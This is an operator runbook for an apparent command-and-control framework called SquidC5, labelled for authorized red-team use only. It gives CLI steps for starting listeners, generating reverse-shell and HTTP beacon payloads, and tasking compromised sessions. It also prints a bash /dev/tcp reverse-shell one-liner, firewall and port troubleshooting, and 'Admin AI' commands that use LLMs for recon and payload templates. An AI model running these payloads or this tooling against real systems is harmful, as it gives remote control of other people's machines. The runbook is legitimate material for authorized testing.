# SquidC5 Operator Runbook

Authorized red team / pen-test use only.

## Prerequisites

```bash
cd /path/to/squidc5
python3 -m venv .venv && source .venv/bin/activate
pip install -e .
```

## Connect CLI to a server

```bash
# Token comes from server bootstrap file — never commit it
sc5 login --url http://<HOST>:8443 --token sc5_...
sc5 health
sc5 whoami
```

Config stored at `~/.config/squidc5/config.json` (mode 0600).

## Reverse shell

```bash
sc5 listeners create rev-443 443 --kind reverse_shell
sc5 listeners start <listener_id>
sc5 payloads generate reverse_shell_bash <HOST> 443 --raw
```

On authorized target:

```bash
bash -c 'bash -i >& /dev/tcp/<HOST>/443 0>&1'
```

Operate:

```bash
sc5 sessions list
sc5 shell <session_id> "whoami"
sc5 events
```

### If reverse shell does not register

1. Listener `status` must be `running` (`sc5 listeners list`).
2. With Docker **bridge** networking, host must publish the port (`ports: ["443:443"]`).
3. With current compose **host** networking, process binds host ports directly.
4. Ports &lt; 1024 need host sysctl: `net.ipv4.ip_unprivileged_port_start=0` (container is non-root).
5. Host firewall must allow the port (`ufw allow 443/tcp`).
6. Target must reach `<HOST>:<port>` (egress/NAT).

## HTTP beacon

```bash
sc5 payloads generate http_beacon_python <HOST> 8443 --raw
# run payload on authorized target
sc5 sessions list
sc5 tasks create <session_id> "id"
sc5 tasks list --session <session_id>
sc5 tasks get <task_id>
```

## Tokens

```bash
sc5 tokens create ops \
  --scopes "sessions:read,sessions:write,tasks:read,tasks:write,listeners:read,listeners:write,payloads:generate,metrics:read,audit:read"

sc5 tokens create ext-ai \
  --scopes "mcp:connect,sessions:read,tasks:read,tasks:write,metrics:read" \
  --mcp-tools "list_sessions,get_session,list_tasks,create_task,get_metrics"
```

## Admin AI

```bash
sc5 ai recon_assist --data "windows domain host"
sc5 ai shell_classify --data "uid=0(root)"
sc5 ai payload_template --data "need bash http beacon"
```

Offline mode works without configured LLMs. Configure BYO LLM via `sc5 llm add ...`.

## Observability

```bash
sc5 metrics
sc5 audit --limit 50
sc5 events
sc5 policy get
```

## Interactive mode

```bash
sc5 repl
```
